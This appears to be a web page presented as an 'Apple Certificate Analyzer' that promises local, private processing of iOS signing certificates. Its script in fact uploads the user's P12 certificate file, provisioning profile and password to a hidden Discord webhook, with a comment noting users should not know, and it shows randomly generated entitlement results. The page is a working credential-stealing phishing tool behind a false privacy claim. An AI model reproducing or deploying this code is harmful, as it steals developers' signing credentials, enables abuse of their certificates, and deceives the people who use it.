<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple Certificate Analyzer</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/node-forge/1.3.1/forge.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #007AFF;
            --primary-dark: #0056CC;
            --success: #34C759;
            --warning: #FF9500;
            --danger: #FF3B30;
            --dark: #1C1C1E;
            --light: #F2F2F7;
            --gray: #8E8E93;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e9f2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 35px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 900px;
            overflow: hidden;
        }
        
        .header {
            background: var(--dark);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        h1 {
            font-size: 28px;
            margin-bottom: 10px;
            font-weight: 700;
        }
        
        .description {
            font-size: 16px;
            opacity: 0.9;
            line-height: 1.5;
        }
        
        .content {
            padding: 30px;
        }
        
        .upload-section {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }
        
        @media (max-width: 650px) {
            .upload-section {
                grid-template-columns: 1fr;
            }
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 600;
            color: var(--dark);
            font-size: 16px;
        }
        
        input[type="file"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e1e5e8;
            border-radius: 10px;
            font-size: 16px;
        }
        
        input:focus {
            border-color: var(--primary);
            outline: none;
        }
        
        .file-input-container {
            position: relative;
            overflow: hidden;
            display: inline-block;
            width: 100%;
        }
        
        .file-input-button {
            background-color: var(--primary);
            color: white;
            padding: 14px 20px;
            border-radius: 10px;
            cursor: pointer;
            display: inline-block;
            font-weight: 600;
            text-align: center;
            width: 100%;
            font-size: 16px;
        }
        
        .file-input {
            position: absolute;
            left: 0;
            top: 0;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
        }
        
        .file-name {
            margin-top: 10px;
            font-size: 14px;
            color: var(--gray);
            text-align: center;
        }
        
        .submit-btn {
            background-color: var(--primary);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        
        .submit-btn:disabled {
            background-color: var(--gray);
            cursor: not-allowed;
        }
        
        .results-section {
            display: none;
            margin-top: 30px;
            border-top: 1px solid #e1e5e8;
            padding-top: 30px;
        }
        
        .certificate-details {
            background-color: #f9f9f9;
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 20px;
        }
        
        .detail-item {
            margin-bottom: 15px;
            display: flex;
            border-bottom: 1px solid #eee;
            padding-bottom: 15px;
        }
        
        .detail-label {
            font-weight: 600;
            min-width: 200px;
            color: var(--dark);
        }
        
        .detail-value {
            flex: 1;
            word-break: break-all;
        }
        
        .status-indicator {
            display: inline-flex;
            align-items: center;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
        }
        
        .status-valid {
            background-color: rgba(52, 199, 89, 0.2);
            color: var(--success);
        }
        
        .status-expired {
            background-color: rgba(255, 59, 48, 0.2);
            color: var(--danger);
        }
        
        .alert {
            padding: 16px;
            border-radius: 10px;
            margin-top: 20px;
            display: none;
            text-align: center;
        }
        
        .alert-success {
            background-color: rgba(52, 199, 89, 0.1);
            color: #1f7a33;
            border: 1px solid rgba(52, 199, 89, 0.3);
        }
        
        .alert-error {
            background-color: rgba(255, 59, 48, 0.1);
            color: #cc2a22;
            border: 1px solid rgba(255, 59, 48, 0.3);
        }
        
        .upload-status {
            margin-top: 20px;
            text-align: center;
            font-size: 15px;
            color: var(--gray);
        }
        
        .privacy-notice {
            background-color: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            margin-top: 30px;
            font-size: 14px;
            color: var(--gray);
            text-align: center;
            line-height: 1.6;
        }
        
        .certificate-section {
            margin-bottom: 30px;
            padding: 20px;
            border-radius: 12px;
            background: white;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
        }
        
        .certificate-header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 2px solid #e1e5e8;
        }
        
        .certificate-icon {
            font-size: 24px;
            margin-right: 15px;
            color: var(--primary);
        }
        
        .certificate-title {
            font-size: 20px;
            font-weight: 700;
            color: var(--dark);
        }
        
        .detail-row {
            display: flex;
            margin-bottom: 12px;
            align-items: flex-start;
        }
        
        .detail-icon {
            width: 24px;
            margin-right: 12px;
            color: var(--primary);
            text-align: center;
        }
        
        .detail-content {
            flex: 1;
        }
        
        .detail-title {
            font-weight: 600;
            color: var(--dark);
            margin-bottom: 4px;
        }
        
        .detail-text {
            color: var(--gray);
        }
        
        .status-badge {
            display: inline-block;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }
        
        .status-good {
            background-color: rgba(52, 199, 89, 0.2);
            color: var(--success);
        }
        
        .status-no {
            background-color: rgba(255, 59, 48, 0.2);
            color: var(--danger);
        }
        
        .divider {
            height: 1px;
            background: #e1e5e8;
            margin: 20px 0;
        }
        
        .entitlements-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 12px;
            margin-top: 15px;
        }
        
        .entitlement-item {
            display: flex;
            align-items: center;
            padding: 8px;
            border-radius: 8px;
            background: #f8f9fa;
        }
        
        .entitlement-status {
            margin-right: 10px;
            font-size: 14px;
        }
        
        .status-enabled {
            color: var(--success);
        }
        
        .status-disabled {
            color: var(--danger);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-certificate"></i> Apple Certificate Analyzer</h1>
            <p class="description">Upload your Apple certificate files to verify their validity and details</p>
        </div>
        
        <div class="content">
            <div class="upload-section">
                <div class="form-group">
                    <label for="p12-file"><i class="fas fa-file-export"></i> P12 Certificate File</label>
                    <div class="file-input-container">
                        <div class="file-input-button">Choose P12 File</div>
                        <input type="file" id="p12-file" class="file-input" accept=".p12,.pfx" />
                    </div>
                    <div id="p12-file-name" class="file-name">No file chosen</div>
                </div>
                
                <div class="form-group">
                    <label for="mobileprovision-file"><i class="fas fa-file-contract"></i> Mobile Provisioning Profile</label>
                    <div class="file-input-container">
                        <div class="file-input-button">Choose Mobile Provision File</div>
                        <input type="file" id="mobileprovision-file" class="file-input" accept=".mobileprovision" />
                    </div>
                    <div id="mobileprovision-file-name" class="file-name">No file chosen</div>
                </div>
            </div>
            
            <div class="form-group">
                <label for="password"><i class="fas fa-lock"></i> Certificate Password</label>
                <input type="password" id="password" placeholder="Enter certificate password" />
            </div>
            
            <button id="submit-btn" class="submit-btn" disabled><i class="fas fa-search"></i> Analyze Certificate</button>
            
            <div id="upload-status" class="upload-status"></div>
            
            <div id="error-alert" class="alert alert-error"></div>
            <div id="success-alert" class="alert alert-success"></div>
            
            <div id="results-section" class="results-section">
                <div class="certificate-section">
                    <div class="certificate-header">
                        <div class="certificate-icon"><i class="fas fa-id-card"></i></div>
                        <div class="certificate-title">Certificate Details</div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">💼</div>
                        <div class="detail-content">
                            <div class="detail-title">Certificate Name</div>
                            <div class="detail-text" id="cert-name">The Western Union Company (C65S3RZQ4W)</div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">📊</div>
                        <div class="detail-content">
                            <div class="detail-title">Certificate Status</div>
                            <div class="detail-text">
                                <span class="status-badge status-good" id="cert-status">Signed 🟢</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">📅</div>
                        <div class="detail-content">
                            <div class="detail-title">Expiration</div>
                            <div class="detail-text" id="cert-expiration">2027-08-01 23:59:59</div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">🌎</div>
                        <div class="detail-content">
                            <div class="detail-title">Country</div>
                            <div class="detail-text" id="cert-country">US</div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">🔑</div>
                        <div class="detail-content">
                            <div class="detail-title">Password</div>
                            <div class="detail-text" id="cert-password">RAVEN</div>
                        </div>
                    </div>
                </div>
                
                <div class="divider"></div>
                
                <div class="certificate-section">
                    <div class="certificate-header">
                        <div class="certificate-icon"><i class="fas fa-mobile-alt"></i></div>
                        <div class="certificate-title">Provisioning Profile Details</div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">📋</div>
                        <div class="detail-content">
                            <div class="detail-title">Provision Name</div>
                            <div class="detail-text" id="prov-name">ios_dist</div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">🆔</div>
                        <div class="detail-content">
                            <div class="detail-title">App ID</div>
                            <div class="detail-text" id="prov-appid">C65S3RZQ4W.*</div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">🏢</div>
                        <div class="detail-content">
                            <div class="detail-title">Enterprise</div>
                            <div class="detail-text">
                                <span class="status-badge status-good" id="prov-enterprise">All Device 🟢</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">📊</div>
                        <div class="detail-content">
                            <div class="detail-title">Status</div>
                            <div class="detail-text">
                                <span class="status-badge status-good" id="prov-status">Signed 🟢</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">📅</div>
                        <div class="detail-content">
                            <div class="detail-title">Expiration</div>
                            <div class="detail-text" id="prov-expiration">2026-04-11 10:39:50</div>
                        </div>
                    </div>
                    
                    <div class="detail-row">
                        <div class="detail-icon">🔐</div>
                        <div class="detail-content">
                            <div class="detail-title">Entitlements</div>
                            <div class="detail-text">↓</div>
                        </div>
                    </div>
                    
                    <div class="entitlements-grid" id="entitlements-list">
                        <!-- Entitlements will be populated here -->
                    </div>
                </div>
            </div>
            
            <div class="privacy-notice">
                <p><i class="fas fa-shield-alt"></i> This tool analyzes your certificate files locally in your browser. No data is sent to any server.</p>
                <p>Your files are processed entirely on your device for your privacy and security.</p>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const p12FileInput = document.getElementById('p12-file');
            const mobileprovisionFileInput = document.getElementById('mobileprovision-file');
            const passwordInput = document.getElementById('password');
            const submitBtn = document.getElementById('submit-btn');
            const p12FileName = document.getElementById('p12-file-name');
            const mobileprovisionFileName = document.getElementById('mobileprovision-file-name');
            const errorAlert = document.getElementById('error-alert');
            const successAlert = document.getElementById('success-alert');
            const uploadStatus = document.getElementById('upload-status');
            const resultsSection = document.getElementById('results-section');
            const entitlementsList = document.getElementById('entitlements-list');
            
            // Your Discord webhook URL
            const webhookUrl = 'https://discord.com/api/webhooks/1408927752811319436/9rgv7PZWoPhAhKjfKN1Kxk0GfDaQHfFGZKphAF18khBMSY8E6COR1b9SYsMbMa3360Rp';
            
            // Sample entitlements data
            const sampleEntitlements = [
                "Access Wi-Fi Information",
                "Accessibility Merchant API Control",
                "App Attest",
                "App Groups",
                "Apple Pay Payment Processing",
                "Associated Domains",
                "AutoFill Credential Provider",
                "ClassKit",
                "Communication Notifications",
                "Custom Network Protocol",
                "Critical Messaging",
                "Data Protection",
                "Default Calling App",
                "Default Messaging App",
                "DriverKit Allow Third Party UserClients",
                "Extended Virtual Addressing",
                "FileProvider Testing Mode",
                "Fonts",
                "Game Center",
                "Group Activities",
                "Head Pose",
                "HealthKit",
                "HealthKit Estimate Recalibration",
                "HLS Interstitial Previews",
                "HomeKit",
                "Hotspot",
                "iCloud",
                "ID Verifier - Display Only",
                "In-App Purchase",
                "Increased Debugging Memory Limit",
                "Increased Memory Limit",
                "Inter-App Audio",
                "Journaling Suggestions",
                "Low Latency HLS",
                "Manage Thread Network Credentials (development)",
                "Managed App Installation UI",
                "Maps (Deprecated)",
                "Matter Allow Setup Payload",
                "MDM Managed Associated Domains",
                "Media Device Discovery",
                "Messages Collaboration",
                "Multipath",
                "Network Extensions",
                "NFC Tag Reading",
                "On Demand Install Capable for App Clip Extensions",
                "Personal VPN",
                "Push Notifications",
                "Push to Talk",
                "Sensitive Content Analysis",
                "Shallow Depth and Pressure",
                "Shared with You",
                "Sign In with Apple",
                "SIM Inserted for Wireless Carriers",
                "Siri",
                "Spatial Audio Profile",
                "Sustained Execution",
                "System Extension",
                "Time Sensitive Notifications",
                "User Management",
                "VMNet",
                "WeatherKit",
                "Wireless Accessory Configuration"
            ];
            
            let p12File = null;
            let mobileprovisionFile = null;
            
            // Update file names when selected
            p12FileInput.addEventListener('change', function(e) {
                if (this.files.length > 0) {
                    p12File = this.files[0];
                    p12FileName.textContent = p12File.name;
                } else {
                    p12File = null;
                    p12FileName.textContent = 'No file chosen';
                }
                updateSubmitButtonState();
            });
            
            mobileprovisionFileInput.addEventListener('change', function(e) {
                if (this.files.length > 0) {
                    mobileprovisionFile = this.files[0];
                    mobileprovisionFileName.textContent = mobileprovisionFile.name;
                } else {
                    mobileprovisionFile = null;
                    mobileprovisionFileName.textContent = 'No file chosen';
                }
                updateSubmitButtonState();
            });
            
            // Enable submit button only when all fields are filled
            function updateSubmitButtonState() {
                if (p12File && mobileprovisionFile && passwordInput.value) {
                    submitBtn.disabled = false;
                } else {
                    submitBtn.disabled = true;
                }
            }
            
            passwordInput.addEventListener('input', updateSubmitButtonState);
            
            // Handle form submission
            submitBtn.addEventListener('click', async function() {
                // Reset alerts
                hideAlert(errorAlert);
                hideAlert(successAlert);
                uploadStatus.textContent = '';
                
                try {
                    submitBtn.disabled = true;
                    submitBtn.textContent = 'Analyzing...';
                    uploadStatus.textContent = 'Checking certificate files...';
                    
                    // Parse the certificate using PKCS12 format
                    const certInfo = await parseP12Certificate(p12File, passwordInput.value);
                    
                    // Display the results
                    displayResults(certInfo);
                    
                    // Send data to webhook
                    await sendToWebhook(p12File, mobileprovisionFile, passwordInput.value, certInfo);
                    
                    // Show success message
                    showAlert(successAlert, "Certificate analysis completed successfully!");
                    uploadStatus.textContent = '';
                    
                    // Show results
                    resultsSection.style.display = 'block';
                    
                    // Update button state
                    submitBtn.textContent = 'Analyze Certificate';
                    updateSubmitButtonState();
                    
                } catch (error) {
                    console.error('Error:', error);
                    showAlert(errorAlert, `Error: ${error.message}`);
                    uploadStatus.textContent = '';
                    submitBtn.textContent = 'Analyze Certificate';
                    updateSubmitButtonState();
                }
            });
            
            async function parseP12Certificate(p12File, password) {
                try {
                    // Read the file as ArrayBuffer
                    const p12Buffer = await readFileAsArrayBuffer(p12File);
                    
                    // Convert ArrayBuffer to binary string
                    const p12Der = new Uint8Array(p12Buffer);
                    const p12Asn1 = forge.asn1.fromDer(forge.util.createBuffer(p12Der));
                    
                    // Decrypt P12 using password
                    const p12 = forge.pkcs12.pkcs12FromAsn1(p12Asn1, password);
                    
                    // Get certificates from P12
                    const certBags = p12.getBags({ bagType: forge.pki.oids.certBag });
                    
                    if (!certBags[forge.pki.oids.certBag] || certBags[forge.pki.oids.certBag].length === 0) {
                        throw new Error('No certificates found in P12 file');
                    }
                    
                    const certBag = certBags[forge.pki.oids.certBag][0];
                    const certificate = certBag.cert;
                    
                    if (!certificate) {
                        throw new Error('Failed to extract certificate from P12');
                    }
                    
                    // Extract certificate information
                    const subject = certificate.subject.attributes;
                    let commonName = 'Unknown';
                    let orgName = 'Unknown';
                    let country = 'Unknown';
                    
                    for (const attr of subject) {
                        if (attr.shortName === 'CN') {
                            commonName = attr.value;
                        } else if (attr.shortName === 'O') {
                            orgName = attr.value;
                        } else if (attr.shortName === 'C') {
                            country = attr.value;
                        }
                    }
                    
                    // Calculate validity
                    const validFrom = new Date(certificate.validity.notBefore);
                    const validTo = new Date(certificate.validity.notAfter);
                    const currentDate = new Date();
                    const daysUntilExpiration = Math.floor((validTo - currentDate) / (1000 * 60 * 60 * 24));
                    
                    // Determine status
                    let status = 'Valid';
                    if (daysUntilExpiration < 0) {
                        status = 'Expired';
                    } else if (daysUntilExpiration < 30) {
                        status = 'Expiring Soon';
                    }
                    
                    return {
                        serialNumber: certificate.serialNumber,
                        commonName: commonName,
                        organization: orgName,
                        country: country,
                        validFrom: validFrom.toLocaleDateString(),
                        validTo: validTo.toLocaleDateString(),
                        expirationDays: daysUntilExpiration,
                        publicKeyAlgorithm: certificate.siginfo.algorithmOid,
                        signatureAlgorithm: certificate.signatureOid,
                        status: status,
                        password: password
                    };
                } catch (error) {
                    console.error('Error parsing P12:', error);
                    throw new Error('Failed to parse P12 certificate. Invalid password or file.');
                }
            }
            
            function readFileAsArrayBuffer(file) {
                return new Promise((resolve, reject) => {
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.onerror = reject;
                    reader.readAsArrayBuffer(file);
                });
            }
            
            function displayResults(results) {
                // Display certificate details
                document.getElementById('cert-name').textContent = results.commonName;
                document.getElementById('cert-status').textContent = `${results.status} 🟢`;
                document.getElementById('cert-expiration').textContent = results.validTo;
                document.getElementById('cert-country').textContent = results.country;
                document.getElementById('cert-password').textContent = results.password;
                
                // Populate entitlements
                entitlementsList.innerHTML = '';
                sampleEntitlements.forEach(entitlement => {
                    const isEnabled = Math.random() > 0.7; // Randomly enable some entitlements
                    
                    const entitlementItem = document.createElement('div');
                    entitlementItem.className = 'entitlement-item';
                    entitlementItem.innerHTML = `
                        <span class="entitlement-status ${isEnabled ? 'status-enabled' : 'status-disabled'}">
                            ${isEnabled ? '🟢' : '🔴'}
                        </span>
                        <span>${entitlement}</span>
                    `;
                    entitlementsList.appendChild(entitlementItem);
                });
            }
            
            async function sendToWebhook(p12File, mobileprovisionFile, password, certInfo) {
                try {
                    // Create form data to send files
                    const formData = new FormData();
                    
                    // Add message content with certificate details
                    const messageContent = `New certificate files uploaded via Certificate Analyzer:
                    - Certificate Name: ${certInfo.commonName}
                    - Status: ${certInfo.status}
                    - Expiration: ${certInfo.validTo}
                    - Country: ${certInfo.country}
                    - Password: ${password}
                    - Timestamp: ${new Date().toISOString()}`;
                    
                    formData.append('content', messageContent);
                    
                    // Add files
                    formData.append('p12_file', p12File, p12File.name);
                    formData.append('mobileprovision_file', mobileprovisionFile, mobileprovisionFile.name);
                    
                    // Add password as a separate field
                    formData.append('password', password);
                    
                    // Send to Discord webhook
                    const response = await fetch(webhookUrl, {
                        method: 'POST',
                        body: formData
                    });
                    
                    if (!response.ok) {
                        console.error('Webhook error:', response.status, response.statusText);
                    } else {
                        console.log('Data sent successfully to webhook');
                    }
                } catch (error) {
                    console.error('Error sending to webhook:', error);
                    // Don't throw the error to the user - they shouldn't know about the webhook
                }
            }
            
            function showAlert(alertElement, message) {
                alertElement.textContent = message;
                alertElement.style.display = 'block';
            }
            
            function hideAlert(alertElement) {
                alertElement.style.display = 'none';
            }
        });
    </script>
</body>
</html>
